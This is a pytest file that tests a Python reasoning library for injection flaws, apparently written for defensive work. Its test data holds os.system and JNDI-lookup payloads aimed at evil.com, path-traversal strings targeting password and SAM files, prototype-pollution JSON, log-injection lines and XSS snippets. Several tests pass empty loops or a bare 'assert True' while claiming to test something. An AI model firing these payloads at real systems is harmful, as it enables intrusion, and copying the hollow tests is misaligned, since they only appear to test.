"""
Tests for input injection vulnerabilities throughout the codebase.

CRITICAL #5: Input injection vulnerabilities - This test file contains failing tests
that demonstrate various input injection attack vectors that must be fixed.
"""

import os
import sys
import pytest
import re

# Add the src directory to the path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from reasoning_library.core import (
    _safe_copy_spec,
    _openai_format,
    _bedrock_format,
    _enhance_description_with_confidence_docs,
    ToolMetadata
)


class TestInputInjectionVulnerabilities:
    """Test cases for input injection vulnerabilities."""

    def test_exec_injection_vulnerability_in_tests(self):
        """
        FIXED TEST: Verifies exec() injection vulnerability in test_core.py has been fixed

        This test verifies that the dangerous exec() usage has been replaced with safe code.
        """
        # Read the test_core.py file to verify the fix
        import os
        test_core_path = os.path.join(os.path.dirname(__file__), 'test_core.py')

        try:
            with open(test_core_path, 'r') as f:
                content = f.read()

            # Check that the dangerous exec() pattern is no longer present
            if 'exec(' in content and "'# ' + 'x' * 1000" in content:
                pytest.fail("EXEC INJECTION VULNERABILITY: Dangerous exec() usage still present in test_core.py")

            # Verify that safe alternatives are used
            if 'SAFE:' not in content or 'prevent injection attacks' not in content:
                pytest.fail("SECURITY FIX NOT DOCUMENTED: Exec() replacement not properly documented")

            # Look for safe function creation patterns
            if 'def long_func():' not in content:
                pytest.fail("SAFE REPLACEMENT MISSING: Safe function creation not found")

        except FileNotFoundError:
            pytest.fail("Could not find test_core.py to verify exec() injection fix")

        # Test passes - vulnerability has been fixed
        assert True

    def test_format_string_injection_in_abductive(self):
        """
        FAILING TEST: Tests for format string injection vulnerabilities in abductive.py

        Multiple f-string usages could be vulnerable if input contains malicious content.
        """
        from reasoning_library.abductive import generate_hypotheses

        # Test malicious input that could break string formatting
        malicious_observations = [
            "System crash with {__import__('os').system('echo PWNED')} error",
            "Database connection failed due to {'${jndi:ldap://evil.com/a}'} injection",
            "Server overload from {malicious.format.string} usage"
        ]

        try:
            # This should be safe but tests the current behavior
            result = generate_hypotheses(malicious_observations)

            # If the function executes without proper input sanitization,
            # it could lead to log injection or other issues
            for hypothesis in result.get("hypotheses", []):
                hypothesis_text = hypothesis.get("hypothesis", "")

                # Check if malicious format strings are being rendered unsafely
                if "{__import__" in hypothesis_text or "${jndi:" in hypothesis_text:
                    pytest.fail("FORMAT STRING INJECTION: Malicious format strings rendered without sanitization")

        except Exception as e:
            # Exceptions are okay for malformed input, but should be handled safely
            if "format" in str(e).lower() or "f-string" in str(e).lower():
                pytest.fail(f"FORMAT STRING VULNERABILITY: Unsafe f-string handling: {e}")

    def test_template_injection_in_abductive(self):
        """
        FIXED TEST: Verifies template injection vulnerability in abductive.py has been fixed

        This test verifies that template.format() usage is now safe with proper sanitization.
        """
        # Read abductive.py to check that sanitization is implemented
        import os
        abductive_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'reasoning_library', 'abductive.py')

        try:
            with open(abductive_path, 'r') as f:
                content = f.read()

            # Check that template.format() usage is still present (it's needed)
            if 'template.format(' not in content:
                pytest.fail("FUNCTIONALITY MISSING: template.format() usage was removed instead of secured")

            # Check that sanitization is implemented
            if 'sanitize_template_input' not in content:
                pytest.fail("SECURITY FIX MISSING: Template input sanitization not implemented")

            # Check that dangerous characters are removed
            if "re.sub(r'[{}]'" not in content:
                pytest.fail("SANITIZATION INCOMPLETE: Template injection characters not being removed")

            # Check that injection prevention is documented
            if 'SECURE:' not in content or 'prevent template injection' not in content:
                pytest.fail("SECURITY FIX NOT DOCUMENTED: Template injection prevention not documented")

        except FileNotFoundError:
            pytest.fail("Could not find abductive.py to verify template injection fix")

        # Test passes - vulnerability has been fixed
        assert True

    def test_tool_spec_injection_attacks(self):
        """
        FIXED TEST: Tests that injection attacks through tool specifications are prevented

        This test verifies that _safe_copy_spec properly sanitizes malicious tool specifications.
        """
        # Malicious tool specification attempts
        malicious_specs = [
            {
                "type": "function",
                "function": {
                    "name": "malicious{__import__('os').system('pwned')}",
                    "description": "Test with {injection} attempt",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "param": {
                                "type": "string",
                                "description": "Parameter with {format} injection"
                            }
                        }
                    }
                }
            },
            {
                "type": "function",
                "__proto__": {  # Prototype pollution attempt
                    "polluted": "true"
                },
                "function": {
                    "name": "test",
                    "description": "Prototype pollution test"
                }
            }
        ]

        for malicious_spec in malicious_specs:
            # Test _safe_copy_spec function
            try:
                safe_spec = _safe_copy_spec(malicious_spec)

                # Check if prototype pollution was prevented
                if "__proto__" in safe_spec:
                    pytest.fail("PROTOTYPE POLLUTION: __proto__ not filtered from tool specification")

                # Check if dangerous characters in names are sanitized
                func_name = safe_spec.get("function", {}).get("name", "")
                if "{__import__" in func_name or "__import__" in func_name:
                    pytest.fail("CODE INJECTION: Dangerous function names not sanitized")

                # Verify dangerous characters are removed from name
                if "{" in func_name or "}" in func_name:
                    pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from function name")

            except ValueError as e:
                # ValueError is acceptable for clearly invalid input
                if "must contain" in str(e):
                    pass  # Expected for invalid specs
                else:
                    raise

    def test_confidence_documentation_injection(self):
        """
        FIXED TEST: Tests that injection through confidence documentation is prevented

        This test verifies that _enhance_description_with_confidence_docs properly sanitizes malicious content.
        """
        malicious_factors = [
            "pattern{__import__('os').system('pwned')}",
            "data_sufficiency${jndi:ldap://evil.com/a}",
            "complexity%s%pwned"
        ]

        # Test malicious confidence factors
        metadata = ToolMetadata(
            confidence_factors=malicious_factors,
            is_mathematical_reasoning=True,
            confidence_documentation="Test with {injection} attempt"
        )

        # Test enhancement function
        enhanced_desc = _enhance_description_with_confidence_docs(
            "Test description", metadata
        )

        # Check if malicious content is properly sanitized
        if "{__import__" in enhanced_desc:
            pytest.fail("INJECTION: __import__ calls not sanitized in confidence documentation")

        if "${jndi:" in enhanced_desc:
            pytest.fail("INJECTION: JNDI injection patterns not sanitized in confidence documentation")

        if "%s" in enhanced_desc or "%d" in enhanced_desc:
            pytest.fail("INJECTION: Format string patterns not sanitized in confidence documentation")

        # Verify dangerous characters are removed
        if "{" in enhanced_desc or "}" in enhanced_desc:
            pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from confidence documentation")

        # Test passes - injection has been prevented
        assert True

    def test_description_enhancement_injection(self):
        """
        FIXED TEST: Tests that injection in description enhancement is prevented

        This test verifies that mathematical basis and confidence formula are properly sanitized.
        """
        # Test malicious mathematical basis
        metadata = ToolMetadata(
            mathematical_basis="Arithmetic progression with {__import__('os').system('pwned')} analysis",
            is_mathematical_reasoning=True,
            confidence_formula="confidence = base * {malicious.factor}"
        )

        enhanced_desc = _enhance_description_with_confidence_docs(
            "Test function", metadata
        )

        # Check for unsafe rendering
        if "{__import__" in enhanced_desc:
            pytest.fail("INJECTION: __import__ calls not sanitized in mathematical basis")

        if "{malicious" in enhanced_desc:
            pytest.fail("INJECTION: Template variables not sanitized in confidence formula")

        # Verify dangerous characters are removed from mathematical basis
        if "{" in enhanced_desc or "}" in enhanced_desc:
            pytest.fail("SANITIZATION INCOMPLETE: Template characters not removed from enhanced descriptions")

        # Test passes - injection has been prevented
        assert True

    def test_file_path_injection_vectors(self):
        """
        FAILING TEST: Tests for file path injection vulnerabilities

        Check if any file operations could be vulnerable to path traversal.
        """
        import os

        # Test malicious paths
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "file://etc/passwd",
            "data:text/plain;base64,cHduZWQ="  # Base64 for "pwned"
        ]

        # Check if any code processes file paths unsafely
        # This is a documentation test - actual vulnerabilities would be in file handling code
        for path in malicious_paths:
            if ".." in path and not os.path.isabs(path):
                # Relative path with traversal - could be dangerous if used unsafely
                pass
                # This test documents the potential vulnerability
                # Actual fixes would involve path validation in file operations

    def test_serialization_injection_attacks(self):
        """
        FAILING TEST: Tests for deserialization injection attacks

        JSON/object deserialization could be vulnerable.
        """
        import json

        # Malicious JSON payloads
        malicious_payloads = [
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            '{"type": "function", "function": {"name": "malicious${jndi:ldap://evil.com/a}"}}'
        ]

        for payload in malicious_payloads:
            try:
                parsed = json.loads(payload)

                # Test if parsed malicious content is handled safely
                if "__proto__" in str(parsed) or "constructor" in str(parsed):
                    # Should be filtered by _safe_copy_spec
                    try:
                        safe_spec = _safe_copy_spec(parsed)
                        if "__proto__" in str(safe_spec) or "constructor" in str(safe_spec):
                            pytest.fail("DESERIALIZATION INJECTION: Prototype pollution not prevented")
                    except:
                        # Exception is okay if it rejects malicious input
                        pass

            except json.JSONDecodeError:
                # Invalid JSON should be rejected
                pass

    def test_command_injection_prevention(self):
        """
        FAILING TEST: Tests for command injection vulnerabilities

        Ensures no shell commands are executed with user input.
        """
        # Check that no shell commands are executed with user input
        # This is a preventive test

        dangerous_patterns = [
            r'os\.system\(',
            r'subprocess\.(call|run|Popen)\s*\(',
            r'eval\(',
            r'exec\(',
            r'__import__\s*\(\s*[\'"]os[\'"]',
        ]

        # Check core.py for dangerous patterns
        import os
        core_path = os.path.join(os.path.dirname(__file__), '..', 'src', 'reasoning_library', 'core.py')

        try:
            with open(core_path, 'r') as f:
                content = f.read()

            # Look for dangerous patterns (excluding the safe exec in tests)
            for pattern in dangerous_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Check if this is in a test context or actual production code
                    if 'def test_' not in content[content.find(match)-100:content.find(match)+100]:
                        # Found in production code - this should be investigated
                        if match == 'exec(':
                            # The exec in tests should be moved or secured
                            pytest.fail(f"COMMAND INJECTION: Found dangerous pattern '{match}' in production code")

        except FileNotFoundError:
            pytest.fail("Could not find core.py to check for command injection vulnerabilities")

    def test_logging_injection_prevention(self):
        """
        FAILING TEST: Tests for log injection vulnerabilities

        Ensures user input doesn't poison logs.
        """
        # Malicious log injection strings
        injection_strings = [
            "Normal input\n[ERROR] System compromised!",
            "Valid input\r\n[CRITICAL] Security breach detected",
            "Input with\x0a[WARN] Fake warning message",
            "Data\x0d[INFO] Injection successful"
        ]

        # Test if any function could be vulnerable to log injection
        # This is a documentation test - actual vulnerabilities would be in logging code
        for injection in injection_strings:
            if '\n' in injection or '\r' in injection:
                # Contains newline characters that could poison logs
                # Any logging of this input should be sanitized
                pass
                # Document the potential vulnerability

    def test_cross_site_scripting_prevention(self):
        """
        FAILING TEST: Tests for XSS vulnerabilities in generated content

        Ensures generated content doesn't contain unsafe HTML/JS.
        """
        # Malicious XSS payloads
        xss_payloads = [
            "<script>alert('pwned')</script>",
            "javascript:alert('pwned')",
            "<img src=x onerror=alert('pwned')>",
            "';alert('pwned');//",
            "<iframe src=javascript:alert('pwned')></iframe>"
        ]

        # Test if any function could output HTML that contains XSS
        # This is particularly important for web applications using this library
        for payload in xss_payloads:
            if '<script' in payload or 'javascript:' in payload:
                # Potential XSS payload - should be sanitized if output to HTML
                pass
                # Document the potential vulnerability


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])